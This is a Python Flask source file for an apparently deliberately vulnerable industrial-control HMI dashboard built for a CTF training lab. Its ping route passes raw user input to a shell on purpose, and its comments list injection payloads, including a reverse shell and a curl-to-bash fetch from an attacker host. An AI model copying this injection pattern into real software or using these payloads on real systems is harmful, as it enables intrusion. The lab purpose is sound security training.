#!/usr/bin/env python3
# =============================================================================
# app.py — Flask Application Entry Point
# OT/ICS HMI Web Application — Legacy Build for Moxa UC-8220 / Debian 9
#
# Author:      [Lab Instructor]
# Date:        2026-04-14
# Description: Flask web application providing:
#                /           — Live process dashboard with gauge visuals
#                /api/tags   — JSON endpoint polled by the dashboard JS
#                /diag       — Internal diagnostics page (hidden from nav)
#                /diag/ping  — Server-side ping execution (INTENTIONALLY VULNERABLE)
#                /api/config — Exposes config (intentional info disclosure)
#
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# WARNING: THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES
# FOR CTF / PENETRATION TESTING TRAINING PURPOSES ONLY.
#
# DO NOT DEPLOY ON PRODUCTION NETWORKS OR EXPOSE TO UNTRUSTED USERS.
# THE /diag/ping ENDPOINT EXECUTES UNSANITIZED USER INPUT AS A SHELL COMMAND.
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#
# PYTHON 3.5 COMPATIBILITY CHANGES vs. modern version:
#   - No f-strings; use .format() and % formatting throughout.
#   - subprocess.run() with capture_output=True and text=True are Python 3.7+.
#     Replaced with stdout=subprocess.PIPE, stderr=subprocess.PIPE,
#     and universal_newlines=True (which is the Python 3.5 equivalent of text=True).
#   - datetime.now(timezone.utc) replaced with datetime.utcnow() for readability
#     (both work in 3.5 but utcnow() is cleaner on older codebases).
#   - Flask 1.1.4 used instead of Flask 3.x (Flask 2+ requires Python 3.6+).
#
# Dependencies: Flask==1.1.4, pylogix==0.8.13, python-dotenv==0.15.0
# Run:          python3 app.py  OR  ./run.sh
# =============================================================================

import os
import logging
import json
import subprocess
from datetime import datetime

from flask import Flask, render_template, jsonify, request

import config
from plc_reader import create_poller

# =============================================================================
# Logging configuration
# =============================================================================

# Ensure the logs/ directory exists before trying to write to it
_log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
if not os.path.isdir(_log_dir):
    os.makedirs(_log_dir)

logging.basicConfig(
    level=logging.DEBUG if config.DEBUG else logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        # Log to stdout (captured by systemd journal or run.sh redirect)
        logging.StreamHandler(),
        # Log to file for persistent diagnostics on the UC-8220
        logging.FileHandler(os.path.join(_log_dir, "app.log")),
    ]
)
logger = logging.getLogger(__name__)

# =============================================================================
# Flask application factory
# =============================================================================

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# Disable strict slashes so /diag and /diag/ both work
app.url_map.strict_slashes = False

# =============================================================================
# PLC poller startup — runs in background thread
# =============================================================================

logger.info("Initialising PLC data poller...")
poller = create_poller()
logger.info("PLC poller started.")


# =============================================================================
# Helper — inject tag range metadata into templates
# =============================================================================

@app.context_processor
def inject_tag_ranges():
    """
    Make TAG_RANGES available to all Jinja2 templates automatically.
    Used by the dashboard template to configure gauge min/max/warn/crit.
    """
    return {"TAG_RANGES": config.TAG_RANGES}


# =============================================================================
# Route: / — Main process dashboard
# =============================================================================

@app.route("/")
def dashboard():
    """
    Render the main HMI dashboard page.

    The page itself is static HTML/JS — it polls /api/tags every 2 seconds
    via XMLHttpRequest to update the gauges without a full page reload.

    Returns:
        Rendered index.html template
    """
    logger.debug("Dashboard page requested from %s", request.remote_addr)
    return render_template(
        "index.html",
        plc_ip=config.PLC_IP,
        app_title="Process Control Dashboard",
    )


# =============================================================================
# Route: /api/tags — JSON data endpoint (polled by dashboard JS)
# =============================================================================

@app.route("/api/tags")
def api_tags():
    """
    Return current tag values and connection status as JSON.

    Called by the dashboard frontend every POLL_INTERVAL seconds via
    XMLHttpRequest. No authentication — intentional for the training lab.

    Returns:
        JSON: {
            "values":     {"Tank_Level": 42.7, ...},
            "connected":  true,
            "last_poll":  "2026-04-14T10:00:00",
            "last_error": null,
            "tag_errors": {}
        }
    """
    data = poller.get_tag_values()
    return jsonify(data)


# =============================================================================
# Route: /diag — Internal diagnostics page
# =============================================================================

@app.route("/diag")
def diagnostics():
    """
    Render the internal diagnostics page.

    This page is NOT linked from the main dashboard — operators access it
    by typing the URL directly. It is intended to look like a legitimate
    internal maintenance tool used by control system engineers.

    Contains:
      - PLC connection health summary
      - Per-tag read error log
      - Network reachability ping utility (INTENTIONALLY VULNERABLE)

    Returns:
        Rendered diag.html template
    """
    logger.debug("Diagnostics page accessed from %s", request.remote_addr)

    # Fetch current connection state snapshot for display
    state = poller.get_tag_values()

    return render_template(
        "diag.html",
        plc_ip=config.PLC_IP,
        plc_slot=config.PLC_SLOT,
        connected=state["connected"],
        last_poll=state["last_poll"],
        last_error=state["last_error"],
        tag_errors=state["tag_errors"],
        poll_interval=config.POLL_INTERVAL,
        # Use utcnow() — compatible with Python 3.5; .strftime is available
        server_time=datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        ping_result=None,
        ping_target=None,
    )


# =============================================================================
# Route: /diag/ping — Server-side ping execution (INTENTIONALLY VULNERABLE)
# =============================================================================

@app.route("/diag/ping", methods=["POST"])
def diag_ping():
    """
    Execute a ping to the user-supplied IP address for OT network reachability
    testing.

    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    INTENTIONAL VULNERABILITY — COMMAND INJECTION
    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

    The `target` field from the POST form is passed DIRECTLY into a shell
    command with no sanitization, validation, or escaping. This allows an
    attacker to inject arbitrary shell commands using metacharacters:

        ; && || | ` $() > < etc.

    Example payloads:
        192.168.0.1; id
        192.168.0.1; cat /etc/passwd
        192.168.0.1; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
        192.168.0.1 && curl http://ATTACKER/shell.sh | bash
        `id`
        $(whoami)

    In a real (hardened) application this would use:
        import ipaddress
        ipaddress.ip_address(target)  # raises ValueError if not valid IP
        result = subprocess.Popen(
            ["ping", "-c", "2", "-W", "2", validated_ip],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

    For training purposes, the vulnerable path is left in place.
    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

    Returns:
        Rendered diag.html with ping output included
    """
    # Retrieve the raw, unsanitized user input from the POST form
    target = request.form.get("target", "")

    logger.info("Ping requested for target: %r (from %s)", target, request.remote_addr)

    ping_output = ""
    ping_error  = False

    if target:
        # -------------------------------------------------------------------
        # VULNERABLE CODE PATH — DO NOT USE IN PRODUCTION
        #
        # The target string is interpolated directly into a shell command.
        # shell=True causes the string to be parsed by /bin/sh, enabling
        # all shell metacharacter injection.
        #
        # NOTE: subprocess.run() with capture_output=True is Python 3.7+.
        # On Python 3.5 / 3.6 we use Popen with communicate() instead,
        # which is available since Python 2.4.
        # -------------------------------------------------------------------
        try:
            # Build the shell command string — target is unsanitized (intentional)
            cmd = "ping -c 2 -W 2 {0}".format(target)
            logger.debug("Executing shell command: %s", cmd)

            # Python 3.5 compatible subprocess: use Popen + communicate()
            # universal_newlines=True is the Py3.5 equivalent of text=True.
            # shell=True + unsanitized input = command injection (intentional).
            proc = subprocess.Popen(
                cmd,
                shell=True,                      # <-- vulnerable: parses via /bin/sh
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True          # decode bytes to str automatically
            )

            # communicate() blocks until the process ends (or timeout).
            # timeout parameter was added in Python 3.3, so it is available here.
            try:
                stdout, stderr = proc.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
                ping_output = "Request timed out."
                ping_error  = True

            if not ping_error:
                # Return both stdout and stderr so injected command output is visible
                ping_output = stdout + stderr
                if not ping_output.strip():
                    ping_output = "(no output)"

        except Exception as exc:
            ping_output = "Error executing ping: {0}".format(exc)
            ping_error  = True
            logger.error("Ping execution error: %s", exc)

    # Re-render diagnostics page with ping result appended
    state = poller.get_tag_values()
    return render_template(
        "diag.html",
        plc_ip=config.PLC_IP,
        plc_slot=config.PLC_SLOT,
        connected=state["connected"],
        last_poll=state["last_poll"],
        last_error=state["last_error"],
        tag_errors=state["tag_errors"],
        poll_interval=config.POLL_INTERVAL,
        server_time=datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        ping_result=ping_output,
        ping_target=target,
        ping_error=ping_error,
    )


# =============================================================================
# Route: /api/config — Exposes application config (intentionally overshared)
# =============================================================================

@app.route("/api/config")
def api_config():
    """
    Return application configuration as JSON.

    INTENTIONAL INFORMATION DISCLOSURE: This endpoint exposes the PLC IP
    address, slot number, tag names, and poll interval — information that
    should be restricted to administrators. In a real HMI this would be
    behind authentication and not accessible from the IT network.

    Useful for CTF participants mapping the OT network topology.
    """
    return jsonify({
        "plc_ip":        config.PLC_IP,
        "plc_slot":      config.PLC_SLOT,
        "poll_interval": config.POLL_INTERVAL,
        "tags":          config.TAGS,
        "version":       "2.3.1-legacy",
        "environment":   "production",   # ironic
        "debug":         config.DEBUG,
        "python_build":  "legacy-py35",  # identifies this as the Debian 9 build
    })


# =============================================================================
# Error handlers
# =============================================================================

@app.errorhandler(404)
def not_found(e):
    """Return a minimal 404 page — no stack trace leakage."""
    return render_template("404.html"), 404


@app.errorhandler(500)
def server_error(e):
    """
    Return a 500 page.
    NOTE: With DEBUG=True (default in this lab), Flask 1.x will render its
    interactive Werkzeug debugger instead — which itself is a training
    vulnerability (Werkzeug debugger PIN bypass).
    """
    return render_template("500.html"), 500


# =============================================================================
# Application entry point
# =============================================================================

if __name__ == "__main__":
    logger.info(
        "Starting OT HMI Flask application on %s:%d (debug=%s)",
        config.WEB_HOST, config.WEB_PORT, config.DEBUG
    )
    app.run(
        host=config.WEB_HOST,
        port=config.WEB_PORT,
        debug=config.DEBUG,
        use_reloader=False,   # Disable reloader — it would spawn a second poller thread
        threaded=True,        # Enable threading for concurrent requests
    )
